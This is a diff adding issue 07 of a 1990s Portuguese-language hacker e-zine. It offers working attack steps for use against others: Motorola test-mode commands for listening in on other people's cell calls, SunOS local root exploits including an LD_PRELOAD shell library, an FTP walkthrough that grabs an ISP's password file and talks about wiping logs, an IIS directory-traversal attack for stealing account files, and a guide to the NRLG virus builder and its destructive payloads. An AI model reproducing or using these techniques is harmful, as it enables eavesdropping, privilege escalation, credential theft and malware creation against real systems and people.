@@ -1,0 +1,756 @@
+			CCCCCCCC  SSSSSSSS  ZZZZZZZZ
+			CC	  SS	     ZZ
+			CC	  SS	      ZZ
+			CC	  SSSSSSSS     ZZ
+			CC		SS	ZZ
+			CC		SS	 ZZ
+			CCCCCCCC  SSSSSSSS  ZZZZZZZZ
+
+			   CSZ - Cheat Struck Zine
+				by Cheat Struck
+
+				       No.07
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ Indice $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+Seção:	Matéria:			Assunto:	Autor:		Nota:
+
+1. 	Introdução			CSZ No.07	Cheat Struck	---
+2.	Phreaking			Telefonia	Cheat Struck	8,5
+3.	Kevin Mitnick			História	Markus Hübner	9,5
+4.	Invasão de privacidade		Spoofing	Cheat Struck	9,0
+5.	Bugz				SunOS bugz	rEPTILE0	9,5
+6.	Hacking para Iniciantes		FAQ p beginners	Cheat Struck	8,0
+7.	Programas Hackers		Nrlg		Cheat Struck	8,5
+8.	Hack, the Art			Win NT hacked	Cheat Struck	10,0
+9.	Cracker'z			prog em asm.	Cheat Struck	9,0
+10.	Preview				oq vem depois?	Cheat Struck	---
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 1. Introdução $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Hellow Galera!!! Ainda estou vivo!!! Como podem vêr o CSZ mudou o vi-
+sual. É... eu decidi fazer um tróço mais moderninho, e não aqueles txtinhos
+colocando um titulo escondido alí, um sub-título aki, e então mudei.
+	A edição agora também está ficando maior por causa dessa mudança e o
+conteudo está melhorando cada vez mais. Outro dia eu estava por ai, navegando
+nesse nosso mundo, e como ví q não tinha nada pra fazer decidi baixar todas,
+eu disse TODAS as edições da zine PHrack, ao total são 53 edições. É claro q
+eu não vou conseguir lêr tudo num dia só, tb porque tenho muito mais coisas
+pra fazer(como lêr a terçeira edição do AXUR, Dar uma olhada nos logs dos ca-
+nais e continuar pesquisando os celulares).
+	AH! Quero avisar q estou precisando de ajuda nas seções: Programação,
+VIRII, ANARCHY(futuramente(quem sabe)), Invasão de privacidade e Bugz. Outra
+coisa: Mandei esse zine para muitas pessoas do canal #Hackers e recebi uma
+critica q é bom eu expor "A seção Dicas Hacks não tá com essa bola toda(...)"
+, realmente, ela não tá tão boa assim, aquela seção era apenas para ajudar os
+BEGINERS na hora de tentar hackear. Mas como poucos gostaram, a seção "Dicas
+Hacks" está morta! E não será mais publicada.
+	Para aqueles q só leram essa edição e não conhecem as outras, me con-
+tatem pelo canal #Hackers e #Senhas no irc.via-rs.com.br porta 6667. Também
+venham fazer críticas, perguntas, incentivo, ou apenas conversar... Vcs podem
+me encontrar todas as noites de sexta(das 12:00 as 6:00) e talvés nos sabados
+quando não tiver nada pra fazer(o que é pouco provavel).
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 2. Phreaking $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Programando Celulares Motorola via TEST MODE (parte 3)
+
+	Aki estão uma outra boa parte dos 99 comandos para test mode em celu-
+lares motorola. Na edição 05 vc encontra a primeira parte e na 06 a segunda.
+	A fonte dessa materia é a biblia motorola, atualmente disponível só
+em inglês(pelo menos na inet só encontrei em inglês). Tem muitos comandos
+inuteis no TEST MODE dos celulares Motorola, por isso eu só esplicarei akeles
+q falarem de algo quente mesmo! Agora é só curtir...
+
+21#  CMD INUTIL(Você não irá precisar)
+
+22#  Mostra a sequencia sync do controle de mensagens do canal. Pressione a
+     tecla # para encerrar o comando.
+
+23#  Mostra a sequência sync das msgs de vóz no canal. Pressione a tecla # p/
+     encerrar o comando.
+
+24#  Mostra dados do controle do canal em forma busy/idle bit. 0=idle 1=busy.
+
+25x# SAT On         Onde                        x=0, SAT=5970HZ
+						x=1, SAT=6000HZ
+						x=2, SAT=6030HZ
+
+26#  SAT Off
+
+27#  Dados Transmitidos(press # para sair).
+
+28#  Ativar o high tone (1150 Hz +/- 55 Hz)
+
+29#  Dessativar o high tone
+
+30#  Ativar o low tone (770 Hz +/- 40 Hz)
+
+31#  Dessativar o low tone
+
+32#  Apagar.
+
+33x# Poe DTMF em x  (1-9, *, 0, #, são os sinais de tone)
+   Onde: x=1    697 Hz + 1209 Hz       14  1150 HZ (não usado no celular)
+	   2    697 Hz + 1336 Hz       15  1209 Hz
+	   3    697 Hz + 1477 Hz       16  1336 Hz
+	   4    770 Hz + 1209 Hz       17  1477 Hz
+	   5    770 Hz + 1336 Hz       18  1633 Hz (não usado no celular)
+	   6    770 Hz + 1477 Hz       19  Desliga DTMF
+	   7    852 Hz + 1209 Hz       20  2087 Hz
+	   8    852 Hz + 1336 Hz       21  2308 Hz
+	   9    852 Hz + 1477 Hz       22  2553 Hz (não usado no celular)
+	   *    941 Hz + 1209 Hz       23  Desliga DTMF
+	   0    941 Hz + 1336 Hz       24  3428 Hz (não usado no celular)
+	   #    941 Hz + 1477 Hz       25  3636 Hz (não usado no celular)
+	  10    697 Hz                 26  4000 Hz (não usado no celular)
+	  11    770 Hz                 27  3555 Hz (não usado no celular)
+	  12    852 Hz                 28  4571 Hz (não usado no celular)
+	  13    941 Hz                 29  Desliga DTMF
+
+34#  Desliga DTMF
+
+35#  Mostra RSSI ("D" Series Portateis Apenas)
+
+     ou
+
+35*# Configura o Caminho do Audio para *
+			    *=0, V.S.P Microphone (Apenas em móveis.)
+			    *=1, Speaker
+			    *=2, Alert
+			    *=3, Handset
+			    *=4, Mute
+			    *=5, External Telephone (Apenas em Portateis.)
+			    *=6, External Handset (Apenas em NEWER Portateis)
+
+	(fim da parte 3)
+
+	Algumas pessoas me perguntaram pq eu estava colocando todos esses co-
+mandos na seção phreaking. Bem... O meu objetivo a principio é descobrir como
+clonar celulares. Eu sei q não vou aprender isso só no TEST MODE mas é assim
+q nois começa a phreakear. Por exemplo: com os comandos já vistos, Dá pra en-
+tender como fazer escutas.
+	Daí chega akele lammer: "Não, eu não entendi". Tá bem! Eu vou
+explicar:
+
+1. Você tem q ligar o RX(receptor), para ouvir o que estarão falando. O
+   comando é 8#.
+2. Vc tem q sintonizar um canal no qual tenha pessoas conversando. O comando
+   é 11#(canal)#. Onde o canal pode ser qqer um com no máximo 4 numeros. Os
+   canais mais usados aqui no Brasil(ou no RS) são:
+	0999
+	1020
+	1000
+	1030
+	0115
+	1025
+   Se mesmo assim não tiver ninguém nesses canais vá tentando os abaixo de
+0800, sempre tem, a não ser q vc more numa cidade onde não tenha chegado os
+celulares ainda :)
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 3. Kevin Mitnick $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+             A História de Mitnick (parte 2)
+
+                ... Por Markus Hübner ...
+
+	Em 25 de Dezembrode 1994, as notícias chegaram rapidamente a Tsutomu
+Shimomura, um expert em segurança do Centro Nacional de Supercomputacão em
+San Diego, California, que estava pasando as férias em Nevada nesse momento
+seu sistema pessoal, conectado via Internet com o Centro de Supercomputacão,
+havia sido alterado. Como podia haver ocorrido isto a um dos maiores experts
+em segurança de computadores do país?...toda uma desonra! A caixa de correio
+de voz de Simomura foi também comprometida em 27 de Dezembro, e uma voz dis-
+farçada dizia "Maldito sejas! Minha técnica é a melhor....Não sabes quem sou?
+...Eu e meus amigos...Te mataremos!".
+
+	A imprensa de todo o mundo estava atenta as historias da recém descu-
+berta falha de segurança da Internet chamada "Protocol Spoofing". Uma vez que
+Shimomura descobriu como havia entrado o intruso, informou inediatamente aos
+demais acerca da técnica. O intruso, (Kevin Mitnick, por suspeito) primero
+havia crackeado um computador "confiado" da Layola University de Chicago.
+"Confiado" significa que este computador em particular estava autorizado a
+enviar arquiivos ao computador de Shimomura na California. As autoridades fe-
+derais foram contactadas e Shimomura estava pronto para a vingança. A base de
+dados do FBI pegou uma lista de possíveis suspeitos, porém Kevin D. Mitnick
+era um dos poucos no topo. Percebeu-se que o hacking parecia haver sido por
+"Jogo de Poder" e não por lucro econômico, o FBI começou a suspeitar de
+Mitnick sobre outros na lista. Uma das regras de Mitnick era nunca guardar
+dados incriminatórios em sua própia máquina. Outra pista contra Mitnick, fo-
+ram os arquivos de software de controle de telefones celulares encontrados.
+
+	Shimomura, insultado pessoalmente, e com sua reputação abatida, em-
+penhou-se a pôr uma armadilha para o insultador. Primero, a voz do intruso
+foi posta como um arquivo de som na Internet para que todos pudessem
+escutá-la...Shimomura sabia que intimimamente seu ego haveria fazer ele mos-
+trar-se novamente. Logo, colocaram um computador 24 horas por dia que monito-
+rava e guardava informações de qualquer atividade incomum no seu micro.
+Armado com uma equipe de autoridades Federais do FBI e da National Security
+Agency, Shimomura observaria pacientemente o bandido aparecer. A armadilha
+havia funcionado... Outra menssagem de voz alterada foi deixada na ecaixa de
+Shimomura que dizia ...."Ah Tsutomu, meu discípulo aprendiz, vejo que põs
+minha voz na Rede....Estou muito desgostoso....".
+
+	Traceando cuidadosamente cada ataque, Shimomura e sua equipe de
+experts junto com Kent Walker, o delegado do Distrito de San Francisco, obti-
+veram licença para localizar chamadas telefônicas. Parecia que o intruso
+estava no Colorado, porém com conhecimentos deste tipo era difícil saber.
+
+	Em 14 de Fevereiro de 1995, as autoridades haviam localizado a seu
+suspeito, na Carolina do Norte. Com a ajuda dos técnicos da Sprint Cellular
+armados com monitores de frequência celular, um sinal foi scanneado num edi-
+ficio de apartamentos em Players Court próximo do aeroporto de Raleigh
+Durham. Foi obtida uma ordem Federal para sua residência....então Mitnick ...
+
+	(fim da parte 2)
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 4. Invasão de privacidade $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Você já lêu a história de Mitnick não é? Se não lêu leia agora, esta
+na seção acima. Pois é... Kevin mitnick invadiu a rede de Shimomura usando
+uma técnica recém descoberta por ele e seus amigos. Essa técnica se chamava
+Protocol Spoofing. Vamos dar uma rapida olhada nessa técnica...
+
+	Protocol Spoofing
+
+	Disfarce. É isto que este ataque faz. Muitas comunicações entre com-
+putadores na Internet se baseiam em "parceiros" confiáveis. Um computador X
+pode manter uma comunicação com um computador Y de forma que não seja neces-
+sária a constante verificação de autenticidade entre eles. O hacker, então,
+se disfarça, dizendo para o computador X que "ele" é o computador Y. Desta
+forma o computador X vai aceitar seus comandos tranqüilamente, enquanto ele
+deita e rola pelo sistema. Esse é o chamado IP spoofing.
+
+	Tb existe o chamado DNS Spoofing q consta em dar um spoof no servidor
+de nomes, fazendo com que você possa dar um nome para o seu IP em qualquer
+servidor. Ou seja, vc estará praticamente anonimo na rede, porque o seu nome
+não existirá, então vc poderá entrar em cualquer canal de IRC, não levará
+mais flood, pode fazer de tudo, ou quase tudo.
+
+	Uma outra coisa q pode se fazer é assumir o IP de outro sistema, as-
+sim vc apronta o q quizer e quem leva bala é o outro usuário conectado. Ou
+usar o IP de um usuário q possui acesso a uma rede protegida por firewall p/
+ter acesso a essa rede e se fizer cualquer coisa a culpa irá para os braços
+do cara q você está assumindo o ip.
+
+	Existem também os Web spofing, é praticamente a mesma coisa sendo que
+o atake é em http.
+
+	ANSI Spoof foi um dos ultimos q eu descobri. Faça a mesma coisa que
+no DNS Spoofing só que no Novo nome coloque códigos de ANSI, tipo %R e %F
+antes do nome, então quando vc entrar em algum canal, os outros usuários ve-
+rão seu IP vermelho(%R) e piscando(%F).
+
+	Existem programas bons para Fazer esse tipo de coisa: "Click",
+"GinSu", para windows, "SPing" e "jizz" para Unixes.
+
+	Ouvi falar num tal de TTY Spofing e tb em Cellular Spoofing, ainda
+não sei do q se trata mas desconfio. Você pode encontrar informações sobre
+eles no zine Phrack No.41 e 11.
+
+	Bem... Isso é tudo o q eu sei sobre spoofing. Existem umas técnicas
+bastante usadas por hackers q consistem em spoofear para invadir sistemas,
+mas isso fica pras próximas edições(quem sabe). Qualquer informação sobre
+spoof ou outra técnica de invasão, pvt-me no irc.
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 5. Bugz $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	SunOS BuGz
+
+	Don't be lame. Soh pelo topico da materia você já entende... Se não
+entende, é porque nem sabe o que é um SunOS.  Eu acho  SunOS  até bom, pois
+sempre onde eu entrava, e era SunOS, não era fácil de  r00tear ou pegar o pwd
+não. :P
+
+##### [/bin/login -n] #####
+Sistemas afetados: Sun 386i, Sun OS 4.0.1
+Como arrumar:   Pegar uma outra versão de SunOS que não tenha o argumento -n
+		com tamanho bug...
+
+	Um problema sério existe no  "/bin/login"  de alguns SunOS.  O pro-
+blema ocorre assim: quando usa-se o argumento -n, o login passa pela autenti-
+ficação e pode desta maneira, permitir qualquer usuário a se tornar root por
+varios caminhos.
+	Veja bem o exemplo abaixo:
+
+host[1] whoami
+user
+host[2] /bin/login -n root
+Login incorrect
+login: kmc
+No home directory specified in password file!  Logging in with home=/
+# whoami
+root
+#
+
+	Viu? Pretty cool... Pegar r00t rapidinho, hehehehe... :)
+
+##### [sync root] #####
+Sistemas afetados: SunOS 4.1.1
+Como arrumar: Coloque um password pro sync, coitado dele. :)
+
+	Isso vai funcionar na maioria dos SunOS que deixam o sync sem
+password... Isso é raro, hehe... Mas já usei isso também, e garanto que fun-
+ciona. Primeiro de tudo, crie um arquivo "sync.c" assim:
+
+sync() {
+execl("/bin/sh","sh",0);
+}
+
+	Pronto, agora faça:
+
+host[1] cc -c -O -R -pic sync.c                       -Compilando.
+host[2] ld -o buglib.so.1.1 -assert pure-text sync.o  -Fazendo um link.
+host[3] setenv LD_PRELOAD ./buglib.so.1.1             -Setando e executando.
+host[4] su sync                                       -Tornando-se r00t. :)
+# whoami
+root
+#
+
+	É isso aí, hehe, too simple!
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 6. Hacking para iniciantes $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Essa seção é dirigida apenas ao pessoal Beginner/newbie/lamer, você q
+acha q já passou por essa fase, não precisa lêr, mas se mesmo assim vc quizer
+lêr essa seção. Não venha me encher o saco depois dizendo: "Bá!¡! QuE zInE
+lAmEr!¡!".
+	Eu conheci um cara muito legal, num chat no via-rs, só q ele não sa-
+bia muita coisa, então começou a me pedir ajuda. Eu vou colocar aki toda a
+ajuda que passei pra ele, na forma de FAQ.
+
+######################
+# FAQ para Beginners #
+######################
+
+P: Qts Mega tem q ter pra particionar o Winchester?
+R: 1.2 já tá bom. Vc usa uns 200M pro linux e deixa o resto pros outros caras
+   q só sabem usar windows.
+
+P: Se eu dividir o meu HD posso fazer merda. Por isso é melhor não ariscar.
+R: Usa o programa FIPS.EXE, ele participa o HD pelo DOS sem complicações.
+
+P: Mas eu tenho q formata o HD né?
+R: Não, ele bota o windows na primeira partição e deixa a segunda pro linux.
+
+P: Onde eu consigo esse programa???
+R: Na maioria dos cds de instalação do linux ele vem junto. Mas se não vier
+   me contate q eu terei prazer em manda-lo pra vc.
+
+P: Onde eu posso conseguir Linux??? Só comprando???
+R: Eu consegui o meu com uns amigos, se vc não conhece ninguém q tenha vai
+   ter q comprar. Os piratas sempre tem, mas não da pra confiar muito.
+
+P: Mas eles cobram caro ou não?
+R: Deve sair uns R$ 8,00 ou 10,00 talvéz, em alguns, por q vão ter uns q vão
+   querer te enganar.
+
+P: Quanto de espaço tem que ter para o linux??
+R: Uns 200M é o minimo para se ter um bom desmpenho.
+
+P: Eu posso usar aquele programa de dividir o HD conectado??
+R: Não, é melhor usa-lo no DOS.
+
+P: Quantos anos vc tem??
+R: 15
+
+P: Vc tem 15 anos?? eu achei que vc tinha uns 20. Pelo que vc sabe.
+R: Com 20 eu vô ta morto ou preso.
+
+P: Vc ta com essa bola toda?? Como vc aprendeu??
+R: Sózinho na inet.
+
+P: Sozinho??
+R: Lendo zines, tutoriais, essas coisas... fiz um curso porcaria no Avila mas
+   eu já sabia mais do q os caras.
+
+P: Quanto tempo faz que vc mexe com computador??
+R: Ganhei esse computador em novembro de 1995
+
+P: Qual pc vc tem??
+R: pentium 100. Ía trocar agora na feira de informatica mas pensei melhor e
+   vo junta o dinheiro para comprar um laptop.
+
+P: Ae se eu tiver alguma duvida eu posso exclarecer contigo??
+R: Okz, mas é bom ir treinando com um programa de telnet ou ftp.
+
+P: São os mesmos comandos?
+R: No telnet sim e no ftp tb.
+
+P: Quais comandos q eu vou mais usar?
+R: ls  = dir(no DOS)
+   cp = copy
+   rm = del
+   mkdir = md
+   pwd = diretório atual
+   password = troca o password da sua conta
+   login = troca o login
+   mv = ren ou move(no DOS)
+
+P: Para que serve a shell??
+R: Cada usuario de unix tem uma conta no seu próprio sistema. Tipo... vc tem
+   a sua, sua irmã tem a dela, seu pai a dele...; e as vezes em outros siste-
+   mas cuando se conecta a ele. Tipo internet.
+
+P: Ta mas pra q serve?
+R: Os arquivos do linux tem tipo uma permissão. vc pode fazer com q o seu
+   arquivo seja apenas lido e escrito por vc.
+
+P: Após instalar o emuladordo linux o q eu posso escrever??
+R: Poe uma password. O comando é "passwd".
+
+P: Para que serve o comando cat???
+R: Pra lêr um arquivo, como o type no DOS.
+
+P: como faço para listar os arquivos??
+R: ls
+
+P: Apareceu uma mensagem assim ==> Wasn't that easy?
+P: depois de digitar o que?
+R: cat data
+R: ah! É só o conteudo do file.
+
+P: Como eu faço pra editar um file?
+R: Tem q ter um editor. Quase sempre tem ou ed ou pico.
+
+P: E se não tiver?? Não tem como?
+R: Aí digita: echo "(conteudo)" >> (arquivo)
+
+P: O que eu coloco no conteudo e no arquivo??
+R: No conteudo poê qquer coisa, tipo..."isto é apenas um teste".
+   e no arquivo poe o nome do arquivo q vc quer criar.
+   Depois digita "cat (nomedo arquivo)" e vê se deu certo.
+
+P: Para que serve o conado "DU"??
+R: O du são reports de um arquivo de sistema q está sendo usado.
+   É muito complexo por isso não tenta entender.
+
+P: Qual é o camndo que eu não devo colocar??
+R: Vai testando todos e descobrindo pra q servem.
+
+P: Conhece algum endereço FTP enteresante?
+R: Entra no prompt do dos e digita "ftp emrede.com.br"
+
+P: Qual o login?
+R: poe anonymous e o password lll@lll.com
+
+P: acess restrict
+R: Ta mas tu entro. Digita ls -la pra vê.
+
+P: E agora? O que eu tenho que fazer??
+R: Entra no diretório etc.
+
+P: Como entra no DIR??
+R: cd etc
+
+P: get passwd ??
+R: faz
+
+P: Fiz! E aí?
+R: Você pegou o arquivo de senhas do provedor!
+
+P: como faço para não deixar vestigios??
+R: vc deve apagar o arquivo de log do provedor
+
+P: como?
+R: Ele pode estar em qualquer lugar e vc não tem acesso a ele. Então digite
+   bye para disconectar dele.
+
+P: Para onde foi as senhas??
+P: em que diretório vc tava quando digitou "ftp emrede.com.br"?
+R: Nenhum. tava na raiz
+R: então o file tá na raiz
+
+P: Achei!! E agora??
+R: lê ele
+
+P: como faço para ler??
+R: type passwd (bahhh!!)
+
+P: Tá, e aí?? Como faço para descriptografar??
+R: Não tá criptografada. Tá Shadowed.
+
+P: fala portugues
+R: O arquivo de passwords não é esse, esse é apenas para enganar.
+
+P: Então qual é o arquivo?
+R: Deve ser o /etc/shadow
+
+	Depois disso o cara não guentou mais e disconectou(isso já eram 4 e
+tantos da manhã). Não sei se ele quer q eu ponha seu nick aki mas as iniciais
+são SS.
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$ 7. Programas Hackers $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+* Nome do produto: [NUKE] RANDOMIC LIFE GENERATOR v0.6B
+
+* Nome interno: NRLG
+
+* Nome do Arquivo: NRLG.EXE
+
+* Nome do Autor:
+
+* Marcas Registradas: <
+
+* Idioma: Português(Brasil)
+
+* Versão do produto: 0.6 Beta Test
+
+* CopyRight: Copyright (c) 1994 AZRAEL & [NuKE] WaReZ
+
+* Comentarios do autor: "Aproveitem [NuKE] caras!! NuKE vai dominar o mundo".
+
+* Meus Comentarios: Provavelmente é um dos programas mais usados para a cria-
+ção de virus, por ser fácil e qquer lamer pode usa-lo. Ele oferece varias op-
+ções para a criação de vírus. Ao inicia-lo, ele verifica se estão todos os
+files alí e se estão no tamanho certo, se não estiverem aparecerá a msg "FILE
+NOT FOUND!! FUCK CRACKERS!" e o prog não iniciará. Vc pode escolher a compi-
+lação imediata abilitando a opção "[*] Create .COM file" porém para compilar
+os virus o programa irá precisar do TASM.EXE e TLINK.EXE q não veem junto com
+o programa.
+
+*Como usar: Depois de inicia-lo vc verá um menu com as seguintes opções:
+"About"
+"New monster"
+"Create"
+"Quit"
+	No menu "About" vc encontra um pouco de informação sobre os autores
+do programa e da sociedade [NuKE].
+
+	No menu "New monster" vc escolhe as caracteristicas do seu virus
+assim como:
+"Name"			=	Nome
+"Activation date"	=	Dia em que o virus será ativado
+"Action"		=	Ação do virus
+"Encription"		=	Criptografar o vírus
+"Kill antivirus"	=	Deleta os antivirus
+"Memory Stealth"	=	Residente na memória
+"Create .ASM file"	=	Cria a fonte do virus em assembler
+"Create .COM file"	=	Compila o virus pra .COM
+	... entre outras. Na opção "Action" vc tem as seguintes funções para
+escolher:
+"1. Snif Snif H.D."	=	Fóde seu H.D. Mata 666 Clusters
+"2. HEY.. My Files"	=	Deleta o file infectado quando for executado.
+"3. SounD'S"		=	Beep.. Beep.. Beep.. No seu PC.
+"4. Display"		=	Mostra um texto no monitor.
+"5. Stop Now!"		=	Para imediatamente o seu proccesador.
+"6. Turtle Speed"	=	Retarda a velocidade do seu PC.
+"7. Warm Reebot"	=	Reseta automaticamente.
+"8. No action"		=	Apenas infecta.
+
+	No menu "Create" vc escolhe:
+"Create a Babe Virus!"	=	Cria o vírus.
+"No create..."		=	Não cria ainda.
+
+	E finalmente no menu "Quit" vc encontra:
+"Quit"			=	Sai do programa.
+"Nop!"			=	Não sai.
+
+	O programa tem uma aparencia bem legal, e uma fonte tb bem tri. As
+fontes vc pode conseguir renomeando os files .DAT para .EXE, em um diretório
+separado, e depois os executando no DOS.
+	Outra coisa legal de se fazer é lêr os textos do menu "About". Vale a
+pena pois os caras tiram onda com a própria cara. Uns txts estão em espanhol
+e por isso tem uma fácil tradução. Pros brasileiros, é claro!
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 8. Hack, the Art $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Vamos falar um pouco sobre segurança nos Sistemas Operacionais. Hoje
+em dia existem uma série de sistemas inseguros. Dentre eles os mais inseguros
+são disparado os da microsoft. Aki está um grafico q representa o nível de
+segurança em cada sistema operacional:
+
+* MS-DOS	: |0%
+* MS-Windows 95 : ==|4%
+* MS-Windows NT : ========|15%
+* OS/2		: =======|14%
+* UNIX		: ==================================|68%
+
+	Nóte o fracasso do Windows 95 em relação a segurança. Após isso a
+Microsoft percebeu seu erro e repassou o Windows 95 com mais cuidado. Então
+surgiu o Windows NT direcionado a redes. A Microsoft ainda promete que as
+próximas edições do WinNT irão substituir de vez o UNIX(Ah! Essa foi boa Bill
+mas vc não enganou ninguém).
+
+	Ta bom agora q nós já falamos um pouco sobre a segurança vc viu q a
+segurança do Win NT ainda é bem baixa né. Pois é...Faiz um tempinho que eu
+comentei sobre o FTPservers que usavam o Microsoft FTP Service. Bem, esses
+provedores não sabem o perigo q correm.
+
+	Primeiro, os WinNT não tem o file passwd, O file de contas dele está
+nomeado como USERS.DAT e tb não está localizado no dir /etc/, ele pode estar
+em qquer diretório. Então como eu faço para achar o file? Bem para encontrar
+o file USERS.DAT vc precisa primeiro pegar o file regedit.exe do server. De-
+pois abra-o e localize o "USERS.DAT".
+
+	Aí vc chega. Tá mas como é que eu pego o file regedit.exe. Da mesma
+maneira que você vai fazer para pegar o USERS.DAT. Vamos utilizar um bug
+fatal dos WinNT. Primeiro certifiquese q este url tem a porta 80 aberta. O q?
+Tu não sabe fazer isso? É mais fácil do que cagar de pé. Primeiro abra entre
+num prog de telnet. Aí Abra o url do provedor assim url.do.provedor:80 ou
+apenas selecione a opção porta e digite 80, se tiver no programa.
+
+	Tá! O provedor tem essa porta aberta. Agora veja qquer diretório do
+servidor, pode ser qquer um. Por exemplo: /usuários/
+
+	Então digite:
+
+www.url.do.servidor/usuários/../../windows/regedit.exe
+
+ou
+
+www.url.do.servidor/usuários/../../../windows/regedit.exe
+
+	Ou vá acressentando mais "../" e o ":80" depois do url se precisar.
+Depois de fazer isso e encontrar o dir do USERS.DAT faça a mesma coisa só que
+dessa vez no lugar do "windows/regedit.exe" digite o dir/USERS.DAT. Por ex:
+O diretório do users.dat é /provedor/etc/users.dat, então vc digitaria:
+
+www.url.do.servidor/usuários/../../provedor/etc/users.dat
+
+	Entendeu como é q funciona o esquema? Nós tiramos proveito de um bug
+no IIS(Internet Information Server).
+
+	Quase sempre vc terá q colocar 2 "../". O primeiro para voltar para o
+dir root, e o segundo para ir pro raiz. Se o diretório raiz for o root, então
+só digite 1 "../". Outra coisa: O REGEDIT.EXE só roda em Windows por isso es-
+sa será uma das poucas ocasiões em que vc dispensará o seu UNIX. Ah! Só um
+ultimo detalhe: Em alguns provedores e bbs's que usam o winNT o caminho do
+users.dat pode ser encontrado no Autoexec.bat junto com o tipo de board.
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 9. Cracker'z $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Nesta edição vai ficar faltando a seção VIRII mas vc pode usar está
+seção para encerrar (por enquanto) o seu aprendizado basico de ASSEMBLER.
+
+	Vamos verificar os ultimos comandos q vc deve saber, para continuar
+a lêr essa seção:
+
+--------ultima parte do tutorial de assembler--------------------------------
+
+##### Comando CMP #####
+Compara dois conjuntos. Ex:
+
+mov ax, A4			; AX = A4
+mov bx, A4			; BX = A4
+cmp ax, bx			; A4(AX) = A4(BX)
+
+##### Comando ORG #####
+Organiza o CS:IP que você quer assemblar. Ex:
+
+1865:0100 JMP 2000		; pula para o ip 2000
+1865:0103 ORG 1865:2000		; você vai pro local 1865:2000
+1865:2000 			; começa a editar aki
+
+##### Comando INT #####
+Chama um DOS ou uma função do BIOS. Exemplo:
+
+mov AL, 6A			; AL = 6A
+int 10				; int 10(video) com a função 6A(800x600)
+mov AX, AX, 4C00		; AX = 4C00
+int 21				; int 21(DOS) com a função 4C00(sai do dos)
+
+##### Conjunto CS #####
+É o primeiro conjunto no qual o ASSEMBLER está trabalhando.
+Exemplo:
+
+1565:0100  mov al,0005
+^^^^--CS
+
+1565:0103  mov ax,0004
+^^^^--CS
+
+--------fim da ultima parte do tutorial de assembler-------------------------
+
+	Pronto agora vamos criar nosso primeiro programa em ASSEMBLER. Esse
+programa será usado na edição q vem para servir como exemplo de Crack.
+
